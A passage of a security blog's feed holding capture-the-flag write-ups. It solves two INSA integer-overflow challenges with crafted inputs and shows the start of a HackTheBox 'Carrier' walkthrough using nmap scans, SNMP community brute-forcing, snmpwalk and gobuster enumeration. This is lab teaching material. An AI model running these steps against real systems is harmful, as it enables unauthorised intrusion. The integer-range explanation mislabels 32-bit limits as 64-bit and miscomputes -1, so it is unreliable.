+  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__isoc99_scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I expect a number.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;gimmeFlagPliz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No, I can't give you the flag: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that our input is stored in an unsigned 64-bit int (v5). As indicated by the file &lt;strong&gt;limits.h&lt;/strong&gt;, this type of variable can hold values between 0 and 4,294,967,295.
+Then, a signed 64-bit int is incremented until reaching the value we submitted. 64-bit signed integers can hold value between −2,147,483,648 and +2,147,483,647.&lt;/p&gt;
+
+&lt;p&gt;The for loop forces us to submit a positive integer, at least when this one is unsigned.&lt;/p&gt;
+
+&lt;p&gt;Let me explain. The following byte: &lt;em&gt;1111 1111&lt;/em&gt; will be seen as &lt;strong&gt;255 in the unsigned world&lt;/strong&gt; and as &lt;strong&gt;-1 in the signed world&lt;/strong&gt;.
+So if we submit 2147483647, the program should return -1 because 2147483647 (unsigned) == 1111111111111111111111111111111 (binary) == -1 (signed).&lt;/p&gt;
+
+&lt;p&gt;Let’s verify this:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./intergover
+Give me one param: 2147483647
+No, I can&lt;span class=&quot;s1&quot;&gt;'t give you the flag: -1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great! The pseudo-code taught us that &lt;strong&gt;v4&lt;/strong&gt; had to be equal to &lt;strong&gt;-14&lt;/strong&gt; in order to call &lt;strong&gt;gimmeFlagPliz()&lt;/strong&gt;, so all we have to do is to submit (2147483647-13) == &lt;strong&gt;2147483634&lt;/strong&gt; and to grab the flag!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ssh_inshack &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2223 user@intergover.ctf.insecurity-insa.fr
+Warning: Permanently added the ECDSA host key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;IP address &lt;span class=&quot;s1&quot;&gt;'[XX.XX.XX.XXX]:2223'&lt;/span&gt; to the list of known hosts.
+ ___           _   _            _      ____   ___  _  ___
+|_ _|_ __  ___| | | | __ _  ___| | __ |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+| &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_ \/ __| |_| |/ _` |/ __| |/ /   __) | | | | | (_) |
+| || | | \__ \  _  | (_| | (__|   &amp;lt;   / __/| |_| | |\__, |
+|___|_| |_|___/_| |_|\__,_|\___|_|\_\ |_____|\___/|_|  /_/
+
+===========================================================
+
+      You are accessing a sandbox challenge over SSH
+        This sandbox will be killed soon enough.
+       Please wait while we launch your sandbox...
+
+===========================================================
+
+Give me one param: 2147483634
+INSA{B3_v3rY_c4r3fUL_w1tH_uR_1nt3g3r_bR0}
+Connection to intergover.ctf.insecurity-insa.fr closed.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;pwn-signed-or-unsigned&quot;&gt;[Pwn] Signed or unsigned&lt;/h2&gt;
+
+&lt;h3 id=&quot;statement-5&quot;&gt;Statement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Signed or not signed, this is the question :)
+&lt;a href=&quot;http://localhost:4000/assets/2019-05-08/signed_or_not_signed&quot; title=&quot;signed or not signed&quot;&gt;Binary&lt;/a&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i &amp;lt;your_keyfile&amp;gt; -p 2228 user@signed-or-not-signed.ctf.insecurity-insa.fr&lt;/code&gt;
+To find your keyfile, look into your profile on this website.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=inXC_lab-34&quot;&gt;https://www.youtube.com/watch?v=inXC_lab-34&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;spotting-the-vulnerability&quot;&gt;Spotting the vulnerability&lt;/h3&gt;
+
+&lt;p&gt;As this challenge is in the same vein as the previous one, I’ll go straight to the solution.&lt;/p&gt;
+
+&lt;p&gt;We have a 64-bit ELF which can be translated in the following pseudo-code:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/code48.png&quot; alt=&quot;Pseudo code&quot; title=&quot;code signed or not signed&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If the user input is inferior to 10, we call the &lt;strong&gt;vuln()&lt;/strong&gt; function.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/vuln.png&quot; alt=&quot;Vuln&quot; title=&quot;Vuln&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The user input is stored in a signed integer so we can submit &lt;strong&gt;-666&lt;/strong&gt; directly and get the flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ssh_inshack &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2228 user@signed-or-not-signed.ctf.insecurity-insa.fr
+
+ ___           _   _            _      ____   ___  _  ___
+|_ _|_ __  ___| | | | __ _  ___| | __ |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+| &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_ \/ __| |_| |/ _` |/ __| |/ /   __) | | | | | (_) |
+| || | | \__ \  _  | (_| | (__|   &amp;lt;   / __/| |_| | |\__, |
+|___|_| |_|___/_| |_|\__,_|\___|_|\_\ |_____|\___/|_|  /_/
+
+===========================================================
+
+      You are accessing a sandbox challenge over SSH
+        This sandbox will be killed soon enough.
+       Please wait while we launch your sandbox...
+
+===========================================================
+Please give me a number:-666
+INSA{Th3_qU3sTi0n_1s_S1gN3d_0r_x90}
+Connection to signed-or-not-signed.ctf.insecurity-insa.fr closed.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Not too much difficulty in this one but well it’s still a flag :)&lt;/p&gt;
+
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html"></summary></entry><entry><title type="html">HackTheBox: Carrier writeup</title><link href="http://localhost:4000/HackTheBox-Carrier.html" rel="alternate" type="text/html" title="HackTheBox: Carrier writeup" /><published>2019-03-16T22:00:00+01:00</published><updated>2019-03-16T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Carrier</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Carrier.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/carrier-box.png&quot; alt=&quot;Carrier box&quot; title=&quot;Carrier Box&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Carrier was a very interesting box where a &lt;strong&gt;web command injection&lt;/strong&gt; gave access to a &lt;strong&gt;BGP router&lt;/strong&gt;. After some &lt;strong&gt;BGP Hijacking&lt;/strong&gt; magic, it was possible to retrieve the FTP credentials of a rich Nigerian Prince, which allowed us to read the flag stored on this FTP server…
+ &lt;!--excerpt--&gt;&lt;/p&gt;
+
+&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#initial-foothold-and-user-access&quot; id=&quot;markdown-toc-initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#very-snmp&quot; id=&quot;markdown-toc-very-snmp&quot;&gt;Very SNMP&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#lyghtspeed-web-server&quot; id=&quot;markdown-toc-lyghtspeed-web-server&quot;&gt;Lyghtspeed web server&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#from-command-injection-to-reverse-shell&quot; id=&quot;markdown-toc-from-command-injection-to-reverse-shell&quot;&gt;From Command Injection to Reverse Shell&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#tickets&quot; id=&quot;markdown-toc-tickets&quot;&gt;Tickets&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#diagnostics&quot; id=&quot;markdown-toc-diagnostics&quot;&gt;Diagnostics&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#road-to-reverse-shell&quot; id=&quot;markdown-toc-road-to-reverse-shell&quot;&gt;Road to Reverse Shell&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege escalation&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#network-configuration&quot; id=&quot;markdown-toc-network-configuration&quot;&gt;Network configuration&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#network-interfaces&quot; id=&quot;markdown-toc-network-interfaces&quot;&gt;Network interfaces&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#bgp-configuration&quot; id=&quot;markdown-toc-bgp-configuration&quot;&gt;BGP configuration&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#routing-table&quot; id=&quot;markdown-toc-routing-table&quot;&gt;Routing table&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#updated-network-diagram&quot; id=&quot;markdown-toc-updated-network-diagram&quot;&gt;Updated network diagram&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#whats-the-plan&quot; id=&quot;markdown-toc-whats-the-plan&quot;&gt;What’s the plan?&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#1012015024-scanning&quot; id=&quot;markdown-toc-1012015024-scanning&quot;&gt;10.120.15.0/24 scanning&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#10120151&quot; id=&quot;markdown-toc-10120151&quot;&gt;10.120.15.1&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#101201510&quot; id=&quot;markdown-toc-101201510&quot;&gt;10.120.15.10&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#bgp-hijacking&quot; id=&quot;markdown-toc-bgp-hijacking&quot;&gt;BGP Hijacking&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#fake-route-advertising&quot; id=&quot;markdown-toc-fake-route-advertising&quot;&gt;Fake route Advertising&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#changing-eth2-ip-address&quot; id=&quot;markdown-toc-changing-eth2-ip-address&quot;&gt;Changing eth2 ip address&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#faking-an-ftp-server&quot; id=&quot;markdown-toc-faking-an-ftp-server&quot;&gt;Faking an FTP server&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#retrieving-the-flag&quot; id=&quot;markdown-toc-retrieving-the-flag&quot;&gt;Retrieving the flag&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#final-words&quot; id=&quot;markdown-toc-final-words&quot;&gt;Final words&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/h2&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;The initial &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan revealed an Apache web server on port 80 and an SSH server on port 22.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; 10.10.10.105
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+PORT   STATE    SERVICE REASON      VERSION
+21/tcp filtered ftp     no-response
+22/tcp open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDI2Jfx6VeMU2wFDys5YoSIVCu4U626/VDawUrXKa5SR+D8HaNvt6QFECtQumoFcYzxD7Jnd3PKw/dXTXvePTPnolDUNV3oim
+X8gEI3iY157v5scgrOKFjw39cTMuTfLc7/rM8e2TOeziN4yzzLfWAiTbe4wfiDe8cea7zJ1RFwvgGc398xiOA8bo1nwMD0wUkduJhtH4V98LpJZOVB4tMmtCdyb1T+e3HIR/1Wbm
+MBLs0e6Cc/rf+K8vgqu6Tu/o4o8/TZ9aH9K5xoDRUXjU2R1w/Bi0HvYYHFRf664/NG9WcK/R0VlV6j92DOYL9wdUYwANyQPc4YCDfyuM6F6Bbd
+|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJToeoLQWJwkfcWBimMzO4E6BKOaHbTkWIk1uHoniOdaUaDL5C6MO2NeYYSaru
+/ikAYSHPU83p1p6hNcOJVy+OY&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+|   256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIN0vm7BcvmBgddJb7k1W7qUkBgn2n0T1bdOU6GV1JB8
+80/tcp open     http    syn-ack     Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Login
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A UDP scan turned out to be also very interesting (&lt;code class=&quot;highlighter-rouge&quot;&gt;--max-retries 0&lt;/code&gt; drastically reduces the scanning time).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--max-retries&lt;/span&gt; 0 10.10.10.105
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-16 19:38 CET
+Warning: 10.10.10.105 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.105
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.040s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 991 open|filtered ports
+PORT      STATE  SERVICE
+161/udp   open   snmp
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;very-snmp&quot;&gt;Very SNMP&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Nmap Scripting Engine&lt;/strong&gt; provides a script named &lt;em&gt;snmp-brute&lt;/em&gt;, which is useful for bruteforcing snmp communities.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; snmp-brute &lt;span class=&quot;nt&quot;&gt;-p161&lt;/span&gt; 10.10.10.105
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-16 19:42 CET
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.105
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.041s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE
+161/udp open  snmp
+| snmp-brute:
+|_  public - Valid credentials
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2.15 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; is a script automating the exploration of a MIB for a given community. Thanks to this tool, we could retrieve a string that will be essential in the rest of the box.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.10.105 &lt;span class=&quot;nt&quot;&gt;-v1&lt;/span&gt;
+iso.3.6.1.2.1.47.1.1.1.1.11 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;SN#NET_45JDX23&quot;&lt;/span&gt;
+End of MIB
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s move on to the web server!&lt;/p&gt;
+
+&lt;h3 id=&quot;lyghtspeed-web-server&quot;&gt;Lyghtspeed web server&lt;/h3&gt;
+
+&lt;p&gt;The web server showed a login page when browsing to &lt;a href=&quot;http://10.10.10.105:80&quot;&gt;http://10.10.10.105:80&lt;/a&gt; as well as &lt;strong&gt;error codes 45007 and 45009&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-login.png&quot; alt=&quot;Lyghtspeed login&quot; title=&quot;Lyghtspeed login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trivial username/password combinations were not successful so I focused on the enumeration using &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.105 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php
+
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+Gobuster v2.0.0              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://10.10.10.105/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 50
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : php
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+2019/03/16 20:14:41 Starting gobuster
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/img &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/tools &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
